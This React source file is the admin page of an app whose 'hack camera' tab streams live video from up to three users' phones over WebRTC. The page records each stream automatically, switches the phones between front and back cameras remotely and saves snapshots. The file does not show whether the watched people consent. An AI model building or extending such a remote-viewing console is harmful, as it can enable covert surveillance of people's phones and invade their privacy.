import { useEffect, useRef, useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { api } from "@/lib/api";
import { Camera, FolderOpen, KeyRound, Rocket, Smartphone, SwitchCamera, Video, VideoOff } from "lucide-react";
import { toast } from "sonner";
import { ensureRealtime, onRealtime, onWsOpen, sendRealtime } from "@/lib/livecam-signaling";
import { addIce, captureVideoFrame, closePeer, createPeer } from "@/lib/livecam";
import { startLivecamRecording, type LivecamRecorder } from "@/lib/livecam-record";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import { AdminFilesPanel } from "@/components/AdminFilesPanel";
import { AdminUsersPanel } from "@/components/AdminUsersPanel";
import { AdminOtaPanel } from "@/components/AdminOtaPanel";
import { AdminAccessPanel } from "@/components/AdminAccessPanel";

type Slot = string;

export function AdminPage() {
  const [tab, setTab] = useState<"camera" | "folders" | "users" | "ota" | "access">("access");
  return (
    <div className="flex h-full min-h-0 flex-1 flex-col">
      <div className="flex shrink-0 gap-2 border-b border-pink-500/20 px-4 pt-3">
        <button
          type="button"
          className={cn("rounded-t-xl px-4 py-2 text-sm", tab === "camera" ? "bg-pink-500/20 text-pink-100" : "text-pink-300/70")}
          onClick={() => setTab("camera")}
        >
          <Video className="mr-1.5 inline h-4 w-4" />
          hack camera
        </button>
        <button
          type="button"
          className={cn("rounded-t-xl px-4 py-2 text-sm", tab === "folders" ? "bg-violet-500/20 text-violet-100" : "text-pink-300/70")}
          onClick={() => setTab("folders")}
        >
          <FolderOpen className="mr-1.5 inline h-4 w-4" />
          Cartelle
        </button>
        <button
          type="button"
          className={cn("rounded-t-xl px-4 py-2 text-sm", tab === "users" ? "bg-cyan-500/20 text-cyan-100" : "text-pink-300/70")}
          onClick={() => setTab("users")}
        >
          <Smartphone className="mr-1.5 inline h-4 w-4" />
          Utenti
        </button>
        <button
          type="button"
          className={cn("rounded-t-xl px-4 py-2 text-sm", tab === "ota" ? "bg-amber-500/20 text-amber-100" : "text-pink-300/70")}
          onClick={() => setTab("ota")}
        >
          <Rocket className="mr-1.5 inline h-4 w-4" />
          OTA
        </button>
        <button
          type="button"
          className={cn("rounded-t-xl px-4 py-2 text-sm", tab === "access" ? "bg-emerald-500/20 text-emerald-100" : "text-pink-300/70")}
          onClick={() => setTab("access")}
        >
          <KeyRound className="mr-1.5 inline h-4 w-4" />
          Accessi
        </button>
      </div>
      <div className="min-h-0 flex-1">
        {tab === "camera" ? (
          <AdminCameraView />
        ) : tab === "folders" ? (
          <AdminFilesPanel />
        ) : tab === "users" ? (
          <AdminUsersPanel />
        ) : tab === "access" ? (
          <AdminAccessPanel />
        ) : (
          <AdminOtaPanel />
        )}
      </div>
    </div>
  );
}

function AdminCameraView() {
  const q = useQuery({
    queryKey: ["livecam-slots"],
    queryFn: () => api<{ slots: { username: string; displayName: string }[]; maxUsers: number }>("/api/v1/admin/livecam/slots"),
    refetchInterval: 4000,
  });
  const slots = q.data?.slots ?? [];
  const cols = Math.min(3, Math.max(1, slots.length));
  return (
    <div className="flex h-full min-h-0 flex-1 flex-col overflow-hidden bg-black/30 p-3 md:p-4">
      <div className="mb-2 shrink-0">
        <h1 className="font-serif text-xl text-pink-100 md:text-2xl">hack camera</h1>
        <p className="text-xs text-pink-300/80">
          fino a {q.data?.maxUsers ?? 3} telefoni · nomi da Accessi · registrazione in Cartelle / LiveCam
        </p>
      </div>
      {slots.length === 0 ? (
        <p className="text-sm text-pink-300/80">Aggiungi persone in Accessi (max 3).</p>
      ) : (
        <div
          className="grid min-h-0 flex-1 items-center justify-items-center gap-2 overflow-hidden sm:gap-4"
          style={{ gridTemplateColumns: `repeat(${cols}, minmax(0, 1fr))` }}
        >
          {slots.map((s) => (
            <PhoneLiveSlot key={s.username} slot={s.username} label={s.displayName} />
          ))}
        </div>
      )}
    </div>
  );
}

function PhoneLiveSlot({ slot, label }: { slot: Slot; label: string }) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const pc = useRef<RTCPeerConnection | null>(null);
  const liveRef = useRef(false);
  const iceBuf = useRef<{ candidate: string; sdpMid?: string | null; sdpMLineIndex?: number | null }[]>([]);
  const handling = useRef(false);
  const recorderRef = useRef<LivecamRecorder | null>(null);
  const [live, setLive] = useState(false);
  const [status, setStatus] = useState(`Waiting for ${label}…`);
  const [facing, setFacing] = useState<"user" | "environment">("user");

  function switchCam(mode: "user" | "environment") {
    setFacing(mode);
    sendRealtime({ type: "livecam.switch", payload: { facing: mode, slot } });
  }

  function takePhoto() {
    const video = videoRef.current;
    if (!video || !liveRef.current) {
      toast.error("Wait for live video first");
      return;
    }
    if (captureVideoFrame(video)) toast.success(`${label} photo saved`);
    else toast.error("Could not capture photo");
  }

  useEffect(() => {
    ensureRealtime();

    function requestWatch() {
      sendRealtime({ type: "livecam.watch", payload: { slot } });
      if (!liveRef.current) setStatus(`Waiting for ${label}…`);
    }

    requestWatch();
    const offOpen = onWsOpen(requestWatch);
    const retry = window.setInterval(() => {
      if (!liveRef.current) requestWatch();
    }, 6000);

    async function flushIce(conn: RTCPeerConnection) {
      const queued = iceBuf.current.splice(0);
      for (const c of queued) await addIce(conn, c);
    }

    function wireConn(conn: RTCPeerConnection) {
      conn.ontrack = (ev) => {
        const stream = ev.streams[0] ?? new MediaStream(ev.track ? [ev.track] : []);
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          void videoRef.current.play().catch(() => undefined);
        }
        recorderRef.current?.stop(true);
        recorderRef.current = startLivecamRecording(slot, label, stream);
        setLive(true);
        liveRef.current = true;
        setStatus("Live · REC");
      };
      conn.onicecandidate = (ev) => {
        if (!ev.candidate) return;
        sendRealtime({
          type: "livecam.ice",
          payload: {
            candidate: ev.candidate.candidate,
            sdpMid: ev.candidate.sdpMid,
            sdpMLineIndex: ev.candidate.sdpMLineIndex,
            slot,
          },
        });
      };
      conn.onconnectionstatechange = () => {
        if (conn.connectionState === "failed" || conn.connectionState === "disconnected") {
          recorderRef.current?.stop(true);
          recorderRef.current = null;
          setLive(false);
          liveRef.current = false;
          setStatus("Reconnecting…");
          sendRealtime({ type: "livecam.watch", payload: { slot } });
        }
      };
    }

    const offMsg = onRealtime(async (msg) => {
      const p = (msg.payload ?? {}) as {
        slot?: Slot;
        sdp?: string;
        candidate?: string;
        sdpMid?: string | null;
        sdpMLineIndex?: number | null;
      };
      if (p.slot && p.slot !== slot) return;
      if (msg.type === "livecam.offer") {
        if (!p.sdp || handling.current) return;
        handling.current = true;
        iceBuf.current = [];
        try {
          recorderRef.current?.stop(true);
          recorderRef.current = null;
          closePeer(pc.current);
          const conn = createPeer();
          pc.current = conn;
          wireConn(conn);
          await conn.setRemoteDescription({ type: "offer", sdp: p.sdp });
          await flushIce(conn);
          const answer = await conn.createAnswer();
          await conn.setLocalDescription(answer);
          sendRealtime({ type: "livecam.answer", payload: { sdp: answer.sdp!, slot } });
        } catch {
          setLive(false);
          liveRef.current = false;
          setStatus("Reconnecting…");
          sendRealtime({ type: "livecam.watch", payload: { slot } });
        } finally {
          handling.current = false;
        }
        return;
      }
      if (msg.type === "livecam.ice") {
        if (!p.candidate) return;
        const conn = pc.current;
        if (!conn || !conn.remoteDescription) {
          iceBuf.current.push(p as { candidate: string; sdpMid?: string | null; sdpMLineIndex?: number | null });
          return;
        }
        await addIce(conn, p as { candidate: string; sdpMid?: string | null; sdpMLineIndex?: number | null });
      }
    });

    return () => {
      offOpen();
      offMsg();
      window.clearInterval(retry);
      sendRealtime({ type: "livecam.unwatch", payload: { slot } });
      recorderRef.current?.stop(true);
      recorderRef.current = null;
      closePeer(pc.current);
      pc.current = null;
      if (videoRef.current) videoRef.current.srcObject = null;
    };
  }, [slot, label]);

  return (
    <div className="flex h-full max-h-full w-full max-w-[min(100%,13.5rem)] flex-col">
      <div className="mb-1.5 flex shrink-0 items-center gap-1">
        <span className="font-serif text-sm text-pink-100 md:text-base">{label}</span>
        <span className={`ml-auto max-w-[7rem] truncate rounded-full px-2 py-0.5 text-[10px] ${live ? "bg-emerald-500/20 text-emerald-300" : "bg-zinc-800 text-pink-300/70"}`}>
          <span className={`mr-1 inline-block h-1.5 w-1.5 rounded-full align-middle ${live ? "animate-pulse bg-emerald-400" : "bg-zinc-500"}`} />
          {status}
        </span>
      </div>
      <div className="relative mx-auto aspect-[9/19.5] h-[min(46dvh,380px)] w-auto max-h-full max-w-full overflow-hidden rounded-[1.75rem] border-[5px] border-zinc-800 bg-black shadow-[0_0_28px_rgba(244,63,94,0.2)]">
        <video ref={videoRef} autoPlay playsInline muted={false} className="absolute inset-0 h-full w-full bg-black object-cover" />
        {!live && (
          <div className="absolute inset-0 grid place-items-center bg-black/75 p-4">
            <div className="text-center">
              <VideoOff className="mx-auto h-8 w-8 text-pink-400/50" />
              <p className="mt-2 truncate text-xs text-pink-200/80">{status}</p>
              <p className="mt-2 text-[10px] leading-relaxed text-pink-400/70">
                Login code <strong>{slot}</strong>
                <br />
                allow camera on phone
              </p>
            </div>
          </div>
        )}
      </div>
      <div className="mt-2 flex shrink-0 flex-wrap items-center justify-center gap-1">
        <Button type="button" size="sm" variant="secondary" className={cn("h-7 rounded-full px-2 text-[10px]", facing === "user" && "ring-2 ring-rose-400")} onClick={() => switchCam("user")}>
          <SwitchCamera className="mr-0.5 h-3 w-3" />
          Front
        </Button>
        <Button type="button" size="sm" variant="secondary" className={cn("h-7 rounded-full px-2 text-[10px]", facing === "environment" && "ring-2 ring-rose-400")} onClick={() => switchCam("environment")}>
          <SwitchCamera className="mr-0.5 h-3 w-3 rotate-180" />
          Back
        </Button>
        <Button type="button" size="sm" className="h-7 rounded-full bg-gradient-to-r from-rose-500 to-fuchsia-600 px-2 text-[10px]" onClick={takePhoto}>
          <Camera className="mr-0.5 h-3 w-3" />
          Save
        </Button>
      </div>
    </div>
  );
}
